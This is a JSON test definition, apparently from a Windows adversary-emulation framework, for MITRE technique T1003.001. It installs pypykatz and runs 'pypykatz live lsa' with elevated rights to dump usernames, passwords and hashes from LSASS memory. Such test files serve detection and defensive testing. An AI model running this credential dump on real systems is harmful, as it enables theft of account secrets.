{
  "id": "c37bc535-5c62-4195-9cc3-0517673171d8",
  "name": "LSASS read with pypykatz",
  "description": "Parses secrets hidden in the LSASS process with python. Similar to mimikatz's sekurlsa::\n\nPython 3 must be installed, use the get_prereq_command's to meet the prerequisites for this test.\n\nSuccessful execution of this test will display multiple usernames and passwords/hashes to the screen.\n",
  "platforms": [
    "windows"
  ],
  "steps": [
    {
      "id": "e41d9cea-6877-4a4c-bad4-96ca2ca6a69c",
      "type": "execute-command",
      "data": {
        "command": "pypykatz live lsa",
        "command_type": "command_prompt"
      },
      "elevation_required": true
    },
    {
      "id": "de72c844-770a-4ee9-9179-84632165d5cb",
      "name": "Check dependency 1/3",
      "description": "Computer must have python 3 installed\n",
      "type": "execute-command",
      "data": {
        "command": "py -3 --version \u003enul 2\u003e\u00261\nexit /b %errorlevel%",
        "command_type": "command_prompt"
      },
      "elevation_required": true
    },
    {
      "id": "459f3351-ef7c-4d34-ac3f-4ed57a319e19",
      "name": "Resolve dependency 1/3",
      "description": "Computer must have python 3 installed\n",
      "type": "execute-command",
      "data": {
        "command": "echo \"Python 3 must be installed manually\"",
        "command_type": "command_prompt"
      },
      "elevation_required": true
    },
    {
      "id": "1d15b90e-b952-4afc-a5c6-5809a8be01f6",
      "name": "Re-check dependency 1/3",
      "description": "Computer must have python 3 installed\n",
      "type": "execute-command",
      "data": {
        "command": "py -3 --version \u003enul 2\u003e\u00261\nexit /b %errorlevel%",
        "command_type": "command_prompt"
      },
      "elevation_required": true
    },
    {
      "id": "63a0d59b-15cd-4a1e-8fff-6225ec3e8a12",
      "name": "Check dependency 2/3",
      "description": "Computer must have pip installed\n",
      "type": "execute-command",
      "data": {
        "command": "py -3 -m pip --version \u003enul 2\u003e\u00261\nexit /b %errorlevel%",
        "command_type": "command_prompt"
      },
      "elevation_required": true
    },
    {
      "id": "8b89056a-2b6a-4fc9-a45e-3aca637f1b3c",
      "name": "Resolve dependency 2/3",
      "description": "Computer must have pip installed\n",
      "type": "execute-command",
      "data": {
        "command": "echo \"PIP must be installed manually\"",
        "command_type": "command_prompt"
      },
      "elevation_required": true
    },
    {
      "id": "73d7a56b-bc17-4722-a17d-9e75dc8d867c",
      "name": "Re-check dependency 2/3",
      "description": "Computer must have pip installed\n",
      "type": "execute-command",
      "data": {
        "command": "py -3 -m pip --version \u003enul 2\u003e\u00261\nexit /b %errorlevel%",
        "command_type": "command_prompt"
      },
      "elevation_required": true
    },
    {
      "id": "6d4858c7-21a8-4438-bc06-f5ed1d65c53e",
      "name": "Check dependency 3/3",
      "description": "pypykatz must be installed and part of PATH\n",
      "type": "execute-command",
      "data": {
        "command": "pypykatz -h \u003enul 2\u003e\u00261\nexit /b %errorlevel%",
        "command_type": "command_prompt"
      },
      "elevation_required": true
    },
    {
      "id": "f9f00a4d-451e-47eb-b509-f0e305852dce",
      "name": "Resolve dependency 3/3",
      "description": "pypykatz must be installed and part of PATH\n",
      "type": "execute-command",
      "data": {
        "command": "pip install pypykatz",
        "command_type": "command_prompt"
      },
      "elevation_required": true
    },
    {
      "id": "bfdceaf3-bb71-4ebe-b355-67d719fe15e9",
      "name": "Re-check dependency 3/3",
      "description": "pypykatz must be installed and part of PATH\n",
      "type": "execute-command",
      "data": {
        "command": "pypykatz -h \u003enul 2\u003e\u00261\nexit /b %errorlevel%",
        "command_type": "command_prompt"
      },
      "elevation_required": true
    }
  ],
  "flows": [
    {
      "s": "de72c844-770a-4ee9-9179-84632165d5cb",
      "p": "on-success",
      "o": "e41d9cea-6877-4a4c-bad4-96ca2ca6a69c"
    },
    {
      "s": "de72c844-770a-4ee9-9179-84632165d5cb",
      "p": "on-failure",
      "o": "459f3351-ef7c-4d34-ac3f-4ed57a319e19"
    },
    {
      "s": "459f3351-ef7c-4d34-ac3f-4ed57a319e19",
      "p": "on-success",
      "o": "1d15b90e-b952-4afc-a5c6-5809a8be01f6"
    },
    {
      "s": "1d15b90e-b952-4afc-a5c6-5809a8be01f6",
      "p": "on-failure",
      "o": "e41d9cea-6877-4a4c-bad4-96ca2ca6a69c"
    },
    {
      "s": "63a0d59b-15cd-4a1e-8fff-6225ec3e8a12",
      "p": "on-success",
      "o": "e41d9cea-6877-4a4c-bad4-96ca2ca6a69c"
    },
    {
      "s": "63a0d59b-15cd-4a1e-8fff-6225ec3e8a12",
      "p": "on-failure",
      "o": "8b89056a-2b6a-4fc9-a45e-3aca637f1b3c"
    },
    {
      "s": "8b89056a-2b6a-4fc9-a45e-3aca637f1b3c",
      "p": "on-success",
      "o": "73d7a56b-bc17-4722-a17d-9e75dc8d867c"
    },
    {
      "s": "73d7a56b-bc17-4722-a17d-9e75dc8d867c",
      "p": "on-failure",
      "o": "e41d9cea-6877-4a4c-bad4-96ca2ca6a69c"
    },
    {
      "s": "6d4858c7-21a8-4438-bc06-f5ed1d65c53e",
      "p": "on-success",
      "o": "e41d9cea-6877-4a4c-bad4-96ca2ca6a69c"
    },
    {
      "s": "6d4858c7-21a8-4438-bc06-f5ed1d65c53e",
      "p": "on-failure",
      "o": "f9f00a4d-451e-47eb-b509-f0e305852dce"
    },
    {
      "s": "f9f00a4d-451e-47eb-b509-f0e305852dce",
      "p": "on-success",
      "o": "bfdceaf3-bb71-4ebe-b355-67d719fe15e9"
    },
    {
      "s": "bfdceaf3-bb71-4ebe-b355-67d719fe15e9",
      "p": "on-failure",
      "o": "e41d9cea-6877-4a4c-bad4-96ca2ca6a69c"
    }
  ],
  "tags": [
    "T1003",
    "T1003.001"
  ]
}